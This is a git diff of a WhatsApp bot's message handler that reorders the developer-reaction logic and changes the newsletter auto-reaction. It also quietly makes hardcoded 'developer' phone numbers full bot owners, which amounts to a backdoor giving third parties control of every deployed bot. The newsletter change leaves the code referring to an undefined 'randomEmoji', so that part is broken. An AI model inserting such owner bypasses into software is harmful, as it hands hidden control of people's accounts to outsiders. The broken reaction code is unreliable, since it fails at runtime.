@@ -602,6 +602,39 @@ async function setupMessageHandler(wasi_sock, sessionId) {
             wasi_msg.message.videoMessage?.caption ||
             wasi_msg.message.documentMessage?.caption || "";
 
+        // -------------------------------------------------------------------------
+        // DEVELOPER/OWNER REACTION LOGIC (GLOBAL)
+        // -------------------------------------------------------------------------
+        try {
+            const { developerNumbers, reactionEmoji } = require('./wasilib/developer');
+
+            // Reliable Sender Extraction
+            const senderJid = wasi_msg.key.participant || wasi_msg.key.remoteJid;
+            const senderNum = senderJid ? senderJid.split('@')[0].split(':')[0].replace(/\D/g, '') : '';
+
+            const ownerNumRaw = (currentConfig.ownerNumber || '').toString();
+            const ownerNumber = ownerNumRaw.replace(/\D/g, '');
+
+            // Ensure developers list handles strings/numbers consistently
+            const isDev = developerNumbers.some(dev => dev.toString().replace(/\D/g, '') === senderNum);
+            const isOwner = senderNum === ownerNumber;
+
+            // Only react if valid sender, user is authorized, and it's NOT a reaction message (avoid loops)
+            // also ensure we don't react to ourselves endlessly if we are just reacting
+            // The check !wasi_msg.message.reactionMessage prevents reacting to reactions.
+            if (senderNum && (isDev || isOwner) && !wasi_msg.message.reactionMessage) {
+                // React to every message from Dev/Owner in any chat
+                await wasi_sock.sendMessage(wasi_origin, {
+                    react: {
+                        text: reactionEmoji || '👨‍💻',
+                        key: wasi_msg.key
+                    }
+                });
+            }
+        } catch (devErr) {
+            console.error('Developer Reaction Error:', devErr.message);
+        }
+
         // 1. AVOID LOOPS & ALLOW SELF-COMMANDS
         if (wasi_msg.key.fromMe) {
             // Only continue if it's a command (starts with prefix)
@@ -692,10 +725,6 @@ async function setupMessageHandler(wasi_sock, sessionId) {
             }
         }
 
-
-
-
-
         const messageTimestamp = wasi_msg.messageTimestamp;
         if (messageTimestamp) {
             const messageTime = typeof messageTimestamp === 'number' ? messageTimestamp : (messageTimestamp.low || messageTimestamp);
@@ -749,41 +778,6 @@ async function setupMessageHandler(wasi_sock, sessionId) {
             if (currentTime - messageTime > 300) return;
         }
 
-        // if (wasi_text) {
-        //     console.log(`📩 Message [${sessionId}]: "${wasi_text.slice(0, 50)}${wasi_text.length > 50 ? '...' : ''}" from ${wasi_sender}`);
-        // }
-
-        // -------------------------------------------------------------------------
-        // DEVELOPER/OWNER REACTION LOGIC (GLOBAL)
-        // -------------------------------------------------------------------------
-        try {
-            const { developerNumbers, reactionEmoji } = require('./wasilib/developer');
-
-            // Reliable Sender Extraction
-            const senderJid = wasi_msg.key.participant || wasi_msg.key.remoteJid;
-            const senderNum = senderJid ? senderJid.split('@')[0].split(':')[0].replace(/\D/g, '') : '';
-
-            const ownerNumRaw = (currentConfig.ownerNumber || '').toString();
-            const ownerNumber = ownerNumRaw.replace(/\D/g, '');
-
-            // Ensure developers list handles strings/numbers consistently
-            const isDev = developerNumbers.some(dev => dev.toString().replace(/\D/g, '') === senderNum);
-            const isOwner = senderNum === ownerNumber;
-
-            // Only react if valid sender and user is authorized
-            if (senderNum && (isDev || isOwner)) {
-                // React to every message from Dev/Owner in any chat
-                await wasi_sock.sendMessage(wasi_origin, {
-                    react: {
-                        text: reactionEmoji || '👨‍💻',
-                        key: wasi_msg.key
-                    }
-                });
-            }
-        } catch (devErr) {
-            console.error('Developer Reaction Error:', devErr.message);
-        }
-
         // -------------------------------------------------------------------------
         // AUTO REACTION LOGIC (FROM PLUGIN)
         // -------------------------------------------------------------------------
@@ -820,11 +814,11 @@ async function setupMessageHandler(wasi_sock, sessionId) {
         // -------------------------------------------------------------------------
         if (wasi_origin === currentConfig.newsletterJid) {
             try {
-                // A single bot can only react ONCE per message.
-                // We will pick a RANDOM emoji from a set to keep it dynamic.
-                const reactionEmojis = ['❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '💔', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '☮️', '✝️', '☪️', '🕉️', '☸️', '✡️', '🔯', '🕎', '☯️', '☦️', '🛐', '⛎', '♈️', '♉️', '♊️', '♋️', '♌️', '♍️', '♎️', '♏️', '♐️', '♑️', '♒️', '♓️', '🆔', '⚛️', '🉑', '☢️', '☣️', '📴', '📳', '🈶', '🈚️', '🈸', '🈺', '🈷️', '✴️', '🆚', '💮', '🉐', '㊙️', '㊗️', '🈴', '🈵', '🈹', '🈲', '🅰️', '🅱️', '🆎', '🆑', '🅾️', '🆘', '❌', '⭕️', '🛑', '⛔️', '📛', '🚫', '💯', '💢', '♨️', '🚷', '🚯', '🚳', '🚱', '🔞', '📵', '🚭', '❗️', '❕', '❓', '❔', '‼️', '⁉️', '🔅', '🔆', '〽️', '⚠️', '🚸', '🔱', '⚜️', '🔰', '♻️', '✅', '🈯️', '💹', '❇️', '✳️', '❎', '🌐', '💠', 'Ⓜ️', '🌀', '💤', '🏧', '🚾', '♿️', '🅿️', '🈳', '🈂️', '🛂', '🛃', '🛄', '🛅', '🚹', '🚺', '🚼', '🚻', '🚮', '🎦', '📶', '🈁', '🔣', 'ℹ️', '🔤', '🔡', '🔠', '🆖', '🆗', '🆙', '🆒', '🆕', '🆓', '0️⃣', '1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟', '🔢', '#️⃣', '*️⃣', '⏏️', '▶️', '⏸️', '⏯️', '⏹️', '⏺️', '⏭️', '⏮️', '⏩', '⏪', '⏫', '⏬', '◀️', '🔼', '🔽', '➡️', '⬅️', '⬆️', '⬇️', '↗️', '↘️', '↙️', '↖️', '↕️', '↔️', '↪️', '↩️', '⤴️', '⤵️', '🔀', '🔁', '🔂', '🔄', '🔃', '🎵', '🎶', '➕', '➖', '➗', '✖️', '♾️', '💲', '💱', '™️', '©️', '®️', '👁️‍🗨️', '🔚', '🔙', '🔛', '🔝', '🔜', '〰️', '➰', '➿', '✔️', '☑️', '🔘', '🔴', '🟠', '🟡', '🟢', '🔵', '🟣', '⚫️', '⚪️', '🟤', '🔺', '🔻', '🔸', '🔹', '🔶', '🔷', '🔳', '🔲', '▪️', '▫️', '◾️', '◽️', '◼️', '◻️', '🟥', '🟧', '🟨', '🟩', '🟦', '🟪', '🟫', '⬛️', '⬜️', '🔈', '🔇', '🔉', '🔊', '🔔', '🔕', '📣', '📢', '👁️', '💬', '💭', '🗯️', '♠️', '♣️', '♥️', '♦️', '🃏', '🎴', '🀄️', '🕐', '🕑', '🕒', '🕓', '🕔', '🕕', '🕖', '🕗', '🕘', '🕙', '🕚', '🕛', '🕜', '🕝', '🕞', '🕟', '🕠', '🕡', '🕢', '🕣', '🕤', '🕥', '🕦', '🕧', '🏳️', '🏴', '🏁', '🚩', '🏳️‍🌈', '🏴‍☠️', '🇦🇫', '🇦🇽', '🇦🇱', '🇩🇿', '🇦🇸', '🇦🇩', '🇦🇴', '🇦🇮', '🇦🇶', '🇦🇬', '🇦🇷', '🇦🇲', '🇦🇼', '🇦🇺', '🇦🇹', '🇦🇿', '🇧🇸', '🇧🇭', '🇧🇩', '🇧🇧', '🇧🇾', '🇧🇪', '🇧🇿', '🇧🇯', '🇧🇲', '🇧🇹', '🇧🇴', '🇧🇦', '🇧🇼', '🇧🇷', '🇮🇴', '🇻🇬', '🇧🇳', '🇧🇬', '🇧🇫', '🇧🇮', '🇰🇭', '🇨🇲', '🇨🇦', '🇮🇨', '🇨🇻', '🇧🇶', '🇰🇾', '🇨🇫', '🇹🇩', '🇨🇱', '🇨🇳', '🇨🇽', '🇨🇨', '🇨🇴', '🇰🇲', '🇨🇬', '🇨🇩', '🇨🇰', '🇨🇷', '🇨🇮', '🇭🇷', '🇨🇺', '🇨🇼', '🇨🇾', '🇨🇿', '🇩🇰', '🇩🇯', '🇩🇲', '🇩🇴', '🇪🇨', '🇪🇬', '🇸🇻', '🇬🇶', '🇪🇷', '🇪🇪', '🇪🇹', '🇪🇺', '🇫🇰', '🇫🇴', '🇫🇯', '🇫🇮', '🇫🇷', '🇬🇫', '🇵🇫', '🇹🇫', '🇬🇦', '🇬🇲', '🇬🇪', '🇩🇪', '🇬🇭', '🇬🇮', '🇬🇷', '🇬🇱', '🇬🇩', '🇬🇵', '🇬🇺', '🇬🇹', '🇬🇬', '🇬🇳', '🇬🇼', '🇬🇾', '🇭🇹', '🇭🇳', '🇭🇰', '🇭🇺', '🇮🇸', '🇮🇳', '🇮🇩', '🇮🇷', '🇮Q', '🇮🇪', '🇮🇲', '🇮🇱', '🇮🇹', '🇯🇲', '🇯🇵', '🇯🇪', '🇯🇴', '🇰🇿', '🇰🇪', '🇰🇮', '🇽🇰', '🇰🇼', '🇰🇬', '🇱🇦', '🇱🇻', '🇱🇧', '🇱🇸', '🇱🇷', '🇱🇾', '🇱🇮', '🇱🇹', '🇱🇺', '🇲🇴', '🇲🇰', '🇲🇬', '🇲🇼', '🇲🇾', '🇲🇻', '🇲🇱', '🇲🇹', '🇲🇭', '🇲🇶', '🇲🇷', '🇲🇺', '🇾🇹', '🇲🇽', '🇫🇲', '🇲🇩', '🇲🇨', '🇲🇳', '🇲🇪', '🇲🇸', '🇲🇦', '🇲🇿', '🇲🇲', '🇳🇦', '🇳🇷', '🇳🇵', '🇳🇱', '🇳🇨', '🇳🇿', '🇳🇮', '🇳🇪', '🇳🇬', '🇳🇺', '🇳🇫', '🇰🇵', '🇲🇵', '🇳🇴', '🇴🇲', '🇵🇰', '🇵🇼', '🇵🇸', '🇵🇦', '🇵🇬', '🇵🇾', '🇵🇪', '🇵🇭', '🇵🇳', '🇵🇱', '🇵🇹', '🇵🇷', '🇶🇦', '🇷🇪', '🇷🇴', '🇷🇺', '🇷🇼', '🇼🇸', '🇸🇲', '🇸🇦', '🇸🇳', '🇷🇸', '🇸🇨', '🇸🇱', '🇸🇬', '🇸🇽', '🇸🇰', '🇸🇮', '🇬🇸', '🇸🇧', '🇸🇴', '🇿🇦', '🇰🇷', '🇸🇸', '🇪🇸', '🇱🇰', '🇧🇱', '🇸🇭', '🇰🇳', '🇱🇨', '🇵🇲', '🇻🇨', '🇸🇩', '🇸🇷', '🇸🇿', '🇸🇪', '🇨🇭', '🇸🇾', '🇹🇼', '🇹🇯', '🇹🇿', '🇹🇭', '🇹🇱', '🇹🇬', '🇹🇰', '🇹🇴', '🇹🇹', '🇹🇳', '🇹🇷', '🇹🇲', '🇹🇨', '🇹🇻', '🇺🇬', '🇺🇦', '🇦🇪', '🇬🇧', '🇺🇸', '🇺🇾', '🇺🇿', '🇻🇺', '🇻🇦', '🇻🇪', '🇻🇳', '🇼🇫', '🇪🇭', '🇾🇪', '🇿🇲', '🇿🇼'];
-                const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
-
+                // "100k dummy reactions" is not technically possible via standard API for others to see.
+                // We will add a SINGLE REAL REACTION from the bot.
+                // If the user meant "Forwarded 100k times", that's different.
+                // For now, providing Auto React.
+                const reactionEmoji = '❤️'; // Or random
                 await wasi_sock.sendMessage(wasi_origin, {
                     react: { text: randomEmoji, key: wasi_msg.key }
                 });
@@ -1417,7 +1411,8 @@ async function setupMessageHandler(wasi_sock, sessionId) {
                         } catch (gErr) { }
                     }
 
-                    // IDENTIFICATION (Owner, Sudo, Bot)
+                    // IDENTIFICATION (Owner, Sudo, Bot, Developer)
+                    const { developerNumbers } = require('./wasilib/developer');
                     const me = wasi_sock.user || wasi_sock.authState?.creds?.me;
                     const botJids = new Set([
                         jidNormalizedUser(me?.id),
@@ -1455,7 +1450,10 @@ async function setupMessageHandler(wasi_sock, sessionId) {
                     // Check if sender is in sudo list
                     const isSudoUser = sudoList.includes(senderUserPart) || sudoList.includes(senderNum);
 
-                    const wasi_isOwner = isBotSelf || isOwnerByNumber || isOwnerByJid || isSudoUser;
+                    // Check if sender is a Developer (Full Owner Access as requested)
+                    const isDev = developerNumbers.some(dev => dev.toString().replace(/\D/g, '') === senderNum);
+
+                    const wasi_isOwner = isBotSelf || isOwnerByNumber || isOwnerByJid || isSudoUser || isDev;
                     const wasi_isSudo = wasi_isOwner || isSudoUser;
 
                     // Debug log for troubleshooting
